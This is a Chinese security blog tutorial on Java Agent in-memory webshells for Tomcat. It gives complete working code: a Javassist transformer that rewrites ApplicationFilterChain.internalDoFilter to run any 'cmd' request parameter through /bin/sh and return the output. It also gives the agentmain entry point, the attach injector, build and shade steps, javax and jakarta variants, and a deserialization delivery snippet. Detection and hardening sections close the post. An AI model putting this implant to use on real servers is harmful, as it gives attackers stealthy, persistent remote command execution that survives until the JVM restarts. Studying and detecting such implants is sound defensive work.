---
title: Java Agent 内存马
date: 2026-08-06
categories: 
- 漏洞分析
tags: 
- java
- agent
- 内存马
- Java安全
---

# Java Agent 内存马

Agent 型内存马是** JVM 字节码层**的无文件内存马，也是**最难检测**的一类。

与 Filter / Servlet / Listener / Valve 不同，Agent 内存马**不注册任何容器组件**——它不往 `StandardContext` 里加任何东西，而是通过 Java Instrumentation 机制（`java.lang.instrument`）注入一个 `ClassFileTransformer`，**改写目标类的字节码**，在请求处理路径（如 `ApplicationFilterChain.internalDoFilter`）上插入命令执行逻辑。类名、包名都是原有的，JMX / Arthas 查容器组件完全看不到。

> 说明：Agent 内存马作用于整个 JVM，不限于 Tomcat，但对运行在 Tomcat 上的 Web 应用最有效。本文以 Tomcat 9.0.100（javax）与 10.1.34（jakarta）为验证版本。

**本质**：模拟 JVM 的字节码重定义（`Instrumentation` + `ClassFileTransformer`），把恶意代码直接插入 `ApplicationFilterChain.internalDoFilter` 方法体，类名、注册表都不变，因此最难检测。整体框架见 [《内存马原理总纲》]({% post_url 2025-12-26-内存马原理总纲 %})。

---

## 一、Java Instrumentation 机制

### 1.1 两种入口：premain 与 agentmain

`java.lang.instrument` 提供两种注入字节码转换器的时机：

| 入口 | 时机 | 注入方式 |
|------|------|---------|
| `premain(String, Instrumentation)` | JVM 启动时 | 启动参数 `-javaagent:evil-agent.jar` |
| `agentmain(String, Instrumentation)` | 运行时（JVM 已启动） | `VirtualMachine.attach(pid)` + `loadAgent()` |

内存马场景几乎都是 **agentmain**——目标 JVM 早已运行，通过 attach 机制从外部注入。

### 1.2 ClassFileTransformer 与 retransform

`Instrumentation.addTransformer(ClassFileTransformer, boolean canRetransform)` 注册一个转换器。它对**之后**加载的类生效；对**已经加载**的类，需要调用 `retransformClasses(Class<?>...)` 触发重新转换：

```
addTransformer(t, true)  →  之后的类加载时调用 t.transform()
retransformClasses(C)    →  已加载的类 C 重新过一遍 transformer（需 canRetransform=true）
```

### 1.3 为什么 Agent 内存马最难检测

```
Filter/Servlet/Listener/Valve 内存马 → 容器里多出"组件"（注册表可见）
Agent 内存马 → 类名不变、包名不变、容器无任何新增组件，改的是内存里的字节码

检测 Agent 型只有两条路：
  1. 枚举 JVM 里注册的 ClassFileTransformer
  2. 对比磁盘 .class 与 JVM 中运行时字节码的差异（diff）
```

---

## 二、注入原理

### 2.1 attach 流程

```
攻击者 JVM / JSP / 反序列化 payload
    ↓ VirtualMachine.attach(目标pid)
    ↓ vm.loadAgent(evil-agent.jar)
    ↓ JVM 调用 agentmain(args, inst)
    ↓ inst.addTransformer(transformer, true)
    ↓ inst.retransformClasses(ApplicationFilterChain)
    ↓ 下一次请求进入 internalDoFilter() 时执行插入的代码
```

### 2.2 选择 hook 点

经典的 hook 点是 **`org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ServletRequest, ServletResponse)`**——它是每个请求进入 Filter 链的必经方法，`$1` 是 `ServletRequest`，`$2` 是 `ServletResponse`：

```
CoyoteAdapter → ... → StandardWrapperValve
    ↓
ApplicationFilterChain.doFilter()
    ↓
internalDoFilter(request, response)   ← 在这里插入命令执行逻辑
    ↓
Filter1 → Filter2 → ... → servlet.service()
```

备选 hook 点：`javax.servlet.http.HttpServlet.service(...)`（见 5.2）。

### 2.3 字节码改写（Javassist）

直接操作字节码很繁琐，这里用 **Javassist** 在 `internalDoFilter` 方法开头 `insertBefore` 一段代码：有 `cmd` 参数就执行命令并写回响应，然后 `return`（短路，不进入 Filter 链）；否则继续原逻辑。

---

## 三、完整代码实现

### 3.1 恶意 Transformer（javax / Tomcat 8.5 / 9.x）

```java
import java.io.ByteArrayInputStream;
import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.LoaderClassPath;

public class EvilTransformer implements ClassFileTransformer {

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        // className 形如 org/apache/catalina/core/ApplicationFilterChain
        if (className == null || !className.equals("org/apache/catalina/core/ApplicationFilterChain")) {
            return null; // 不关心的类返回 null，保持原字节码
        }
        CtClass ct = null;
        try {
            // 每次用全新 ClassPool：ClassPool.getDefault() 是全局共享池，
            // makeClass 发现同名类已在池里就返回缓存的 CtClass（可能已 modified），会跳过插入
            ClassPool pool = new ClassPool(null);
            if (loader != null) {
                // 让 javassist 编译插入片段时能解析 javax.servlet 等类型（用目标类的 classloader）
                pool.appendClassPath(new LoaderClassPath(loader));
            }
            // 从"当前已加载类"的字节码构造，而不是 ClassPool.getDefault().get(className)：
            // Tomcat 里 catalina.jar 由 common classloader 加载，java.class.path 上找不到
            ct = pool.makeClass(new ByteArrayInputStream(classfileBuffer));
            // $1 = ServletRequest, $2 = ServletResponse（internalDoFilter 的两个参数）
            ct.getDeclaredMethod("internalDoFilter").insertBefore(
                "javax.servlet.ServletRequest __req = $1;"
                + "String __c = __req.getParameter(\"cmd\");"
                + "if (__c != null && !__c.isEmpty()) {"
                + "  try {"
                + "    Process __p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",__c});"
                + "    java.io.InputStream __in = __p.getInputStream();"
                + "    byte[] __buf = new byte[4096];"
                + "    java.io.ByteArrayOutputStream __bout = new java.io.ByteArrayOutputStream();"
                + "    int __len;"
                + "    while ((__len = __in.read(__buf)) != -1) __bout.write(__buf, 0, __len);"
                + "    ((javax.servlet.http.HttpServletResponse)$2).setContentType(\"text/html;charset=UTF-8\");"
                + "    ((javax.servlet.http.HttpServletResponse)$2).getWriter().write(\"<pre>\" + new String(__bout.toByteArray(), \"UTF-8\") + \"</pre>\");"
                + "  } catch (Exception __e) { __e.printStackTrace(); }"
                + "  return;"
                + "}"
            );
            byte[] bytes = ct.toBytecode();
            return bytes;
        } catch (Throwable t) {
            t.printStackTrace();
        } finally {
            if (ct != null) ct.detach();
        }
        return null;
    }
}
```

### 3.2 Agent 入口 agentmain（javax）

```java
import java.lang.instrument.Instrumentation;

public class EvilAgent {

    public static void agentmain(String args, Instrumentation inst) {
        inst.addTransformer(new EvilTransformer(), true);

        // 不能用 Class.forName 定位目标类：agentmain 跑在 system classloader，
        // 而 ApplicationFilterChain 由 Tomcat 的 common classloader 加载，forName 会抛
        // ClassNotFoundException。改用 getAllLoadedClasses() 遍历已加载类来定位。
        Class<?> target = null;
        for (Class<?> c : inst.getAllLoadedClasses()) {
            if ("org.apache.catalina.core.ApplicationFilterChain".equals(c.getName())) {
                target = c;
                break;
            }
        }
        if (target == null) {
            System.out.println("[!] ApplicationFilterChain not loaded");
            return;
        }
        try {
            // 目标类在 attach 时已加载，需 retransform 才会重写字节码
            inst.retransformClasses(target);
            System.out.println("[+] Agent transformer applied to ApplicationFilterChain");
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }
}
```

### 3.3 attach 触发类（javax）

```java
import com.sun.tools.attach.VirtualMachine;

public class AttachShell {

    public static void inject(String targetPid, String agentJarPath) throws Exception {
        VirtualMachine vm = VirtualMachine.attach(targetPid);
        try {
            vm.loadAgent(agentJarPath);
        } finally {
            vm.detach();
        }
    }
}
```

`targetPid` 可用 `jps -l` 获取（Tomcat 的 pid 通常记为 `org.apache.catalina.startup.Bootstrap`）。

### 3.4 构建 agent jar

agent jar 的 MANIFEST 必须包含 `Agent-Class`，并声明 `Can-Retransform-Classes: true`：

```
Manifest-Version: 1.0
Agent-Class: EvilAgent
Can-Retransform-Classes: true
```

```bash
# 1. 编译（需要 javassist.jar；AttachShell 需额外 --add-modules jdk.attach）
javac -cp javassist.jar -d agent_classes EvilAgent.java EvilTransformer.java

# 2. 打包（Manifest 放 META-INF/MANIFEST.MF）
jar cfm evil-agent.jar META-INF/MANIFEST.MF -C agent_classes .

# 3. 由于 agent 类由系统类加载器加载，javassist 必须可达。
#    最简单的方式是用 maven-shade-plugin 把 javassist 打进 agent jar（fat jar）：
```

```xml
<!-- pom.xml 片段：shade 打包，把 javassist 打进去，并写入 Agent-Class 清单 -->
<build>
  <finalName>evil-agent</finalName>
  <plugins>
    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-shade-plugin</artifactId>
      <version>3.5.1</version>
      <executions>
        <execution>
          <phase>package</phase>
          <goals><goal>shade</goal></goals>
          <configuration>
            <transformers>
              <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
                <manifestEntries>
                  <Agent-Class>EvilAgent</Agent-Class>
                  <Can-Retransform-Classes>true</Can-Retransform-Classes>
                </manifestEntries>
              </transformer>
            </transformers>
          </configuration>
        </execution>
      </executions>
    </plugin>
  </plugins>
</build>
```

### 3.5 jakarta（Tomcat 10+）版本差异

`ApplicationFilterChain` 类路径不变（`org.apache.catalina.core`），但插入的字节码里引用的 Servlet 类型要换包名：

```java
// javax（Tomcat 8.5 / 9.x）
"javax.servlet.ServletRequest __req = $1;"
"((javax.servlet.http.HttpServletResponse)$2).getWriter()..."

// jakarta（Tomcat 10.x / 11.x）—— 插入字符串里全部替换
"jakarta.servlet.ServletRequest __req = $1;"
"((jakarta.servlet.http.HttpServletResponse)$2).getWriter()..."
```

`EvilAgent` 与 `AttachShell` 两个版本完全一致。

---

## 四、代码详解

### 4.1 transform 返回 null 的语义

`transform` 返回 `null` 表示"不修改该类，保留原字节码"。因此必须用 `className` 白名单精确命中目标类，否则 JVM 里每个类都会过一遍转换器，浪费性能且容易出错。

### 4.2 $1 / $2 参数引用

Javassist 里 `$1`、`$2` 是方法参数占位符。`internalDoFilter(ServletRequest, ServletResponse)` 的 `$1` 是请求、`$2` 是响应。`ServletResponse` 没有 `getWriter()`，所以要强转成 `HttpServletResponse`。

### 4.3 canRetransform 与 retransformClasses

- `addTransformer(t, true)` 的第二个参数 `true` 表示**允许 retransform**。
- 对已加载的类，必须显式 `retransformClasses(...)` 才会生效；只 addTransformer 不会影响已加载类。

### 4.4 实战踩坑：ClassPool 与已加载类（Tomcat 8.5.39 / JDK 8 实测）

3.1 的写法是在真实 Tomcat 上**逐一踩坑后修正**的，三个关键点缺一不可：

1. **`Class.forName` 定位不了目标类**：agentmain 跑在 system classloader，而 `ApplicationFilterChain` 由 Tomcat 的 **common classloader** 加载，`Class.forName` 直接抛 `ClassNotFoundException`。必须用 `inst.getAllLoadedClasses()` 遍历已加载类来定位（见 3.2）。

2. **`ClassPool.getDefault().get(className)` 找不到类**：javassist 按 `java.class.path` 解析，但 catalina.jar 由 common classloader 加载、不在 `java.class.path` 上。必须从 `transform()` 收到的 `classfileBuffer`（当前已加载类的实际字节码）用 `pool.makeClass(new ByteArrayInputStream(classfileBuffer))` 构造 CtClass。

3. **`ClassPool.getDefault()` 全局共享池会跳过插入**：`makeClass` 发现同名类已在池里时返回**缓存的 CtClass**（可能已 modified），导致 `isModified()=true` 跳过 `insertBefore`——表现是 attach 成功、类却没被改。必须**每次调用新建 `ClassPool(null)`**，并 `appendClassPath(new LoaderClassPath(loader))` 让 javassist 编译插入片段时能解析 `javax.servlet` 等类型（loader 是目标类的 classloader）。

> 实测链路（每步写入 `/tmp/evil-agent-debug.log`）：
> `agentmain 开始 → 找到目标类 → transform 被调用 → makeClass 成功 → insertBefore 完成 → transform OK → retransformClasses 调用成功`
> 此时任意请求带 `?cmd=whoami` 即执行命令。

### 4.5 版本兼容性

| Tomcat 版本 | 目标类 | 插入字符串里的 Servlet 包 |
|-------------|--------|--------------------------|
| 8.5.x / 9.x | `org.apache.catalina.core.ApplicationFilterChain` | `javax.servlet.*` |
| 10.x / 11.x | `org.apache.catalina.core.ApplicationFilterChain` | `jakarta.servlet.*` |

---

## 五、利用场景

### 5.1 反序列化 → attach

Shiro / Fastjson 反序列化拿到代码执行后，调用 `AttachShell.inject(pid, agentJar)` 即可完成注入（agent jar 可放在内存中由 `URLClassLoader` 加载后 attach，或先写到临时目录）：

```java
// 反序列化 payload 中的代码片段
String pid = "...";                  // 目标 Tomcat 的 JVM pid
String agent = "/tmp/evil-agent.jar"; // 提前上传或内嵌写出
AttachShell.inject(pid, agent);
```

### 5.2 备选 hook 点：HttpServlet.service

如果 `internalDoFilter` 被某些组件替换（少见），可改 hook `javax.servlet.http.HttpServlet.service`：

```java
// 把 3.1 里的目标类换成 HttpServlet（同样用 getAllLoadedClasses 定位，见 4.4）
Class<?> target = null;
for (Class<?> c : inst.getAllLoadedClasses()) {
    if ("javax.servlet.http.HttpServlet".equals(c.getName())) {
        target = c;
        break;
    }
}
inst.retransformClasses(target);
// transformer 里 insertBefore 的代码相同（service 的参数 $1/$2 也是 request/response）
```

### 5.3 隐蔽性优势

- 容器注册表（filterDefs / filterMaps / listeners / pipeline valves）完全无变化；
- 类名保持 `ApplicationFilterChain`，常规类名扫描（`sc *.Filter*`）不命中；
- 常规内存马查杀工具（枚举容器组件）对 Agent 型无效。

---

## 六、检测方式

### 6.1 枚举 ClassFileTransformer

Agent 内存马本质是注册了一个 transformer。用 JDK 自带的 `Instrumentation` 枚举（需要 attach 一个自写的检测 agent）：

```java
// 检测 agent：把注册的 transformer 类名打印出来
public static void agentmain(String args, Instrumentation inst) {
    Class<?>[] classes = inst.getAllLoadedClasses();
    // 触发一次重转换，观察是否有 transformer 命中不该改的类
    for (Class<?> c : classes) {
        if (c.getName().equals("org.apache.catalina.core.ApplicationFilterChain")) {
            inst.retransformClasses(c);
        }
    }
}
```

> 更简单的方式：对比"磁盘上的 ApplicationFilterChain.class"与"JVM 中运行时的字节码"——用 `Instrumentation` 无法直接 dump 字节码，实践中可借助 Arthas 的 `jad` 反编译对比源码是否被插入逻辑。

### 6.2 Arthas 反编译对比

```bash
# 反编译运行时字节码，观察 internalDoFilter 是否被插入了可疑逻辑
jad org.apache.catalina.core.ApplicationFilterChain
# 与源码对比，出现 __req / __bout / Runtime.getRuntime().exec 等特征即为 Agent 内存马
```

### 6.3 查看 agent 加载状态

```bash
jcmd <pid> VM.class_hierarchy org.apache.catalina.core.ApplicationFilterChain
# 观察是否有注入的 transformer 特征；或直接重启应用清除
```

> **注意**：Agent 型内存马**无法热移除**，大部分查杀工具只能检测不能清除；彻底清除需要重启 JVM。

---

## 七、防御建议

| 层面 | 措施 | 说明 |
|------|------|------|
| **JVM** | `-XX:+DisableAttachMechanism` | 禁止运行时 attach，从源头阻断 agentmain 注入 |
| **JVM** | 枚举 `Instrumentation` 的 transformer | 检测已注册的转换器 |
| **RASP** | 监控 `retransformClasses` / `addTransformer` 调用 | 拦截运行时字节码改写 |
| **事前** | 修复反序列化等 RCE 漏洞 | 切断注入入口（否则任何检测都是事后） |

```bash
# 启动参数禁用 attach 机制（Tomcat 的 JAVA_OPTS）
CATALINA_OPTS="-XX:+DisableAttachMechanism"
```

---

## 八、总结

四种内存马中，Agent 型**隐蔽性最高、检测难度最大，但也最"重"**：

| 特性 | Filter/Servlet/Listener/Valve | **Agent** |
|------|------------------------------|-----------|
| 作用层 | 容器组件（注册表可见） | **JVM 字节码（无注册表）** |
| 检测难度 | 可枚举组件对比 | **需对比字节码 / 枚举 transformer** |
| 是否可热移除 | 多数可 | **不可（需重启）** |
| 隐蔽性 | 中~高 | **最高** |

**攻击者偏好排序**（综合隐蔽性与功能）：
1. **Agent** — 最隐蔽，最难检测/清除
2. **Valve** — 隐蔽，注入简单
3. **Listener** — 隐蔽，触发早
4. **Filter / Servlet** — 常见，易被监控

> **延伸阅读**：[Tomcat Filter 内存马]({% post_url 2025-12-27-Tomcat_filter内存马的 %}) | [Tomcat Servlet 内存马]({% post_url 2025-12-27-Tomcat_servlet内存马 %}) | [Tomcat Listener 内存马]({% post_url 2025-12-27-Tomcat_ listener内存马 %}) | [Tomcat Valve 内存马]({% post_url 2026-08-06-Tomcat_Valve内存马 %}) | [Spring 容器内存马]({% post_url 2026-08-06-Spring_容器内存马 %}) | [WebSocket 等偏门内存马]({% post_url 2026-08-06-Tomcat_WebSocket等偏门内存马 %})
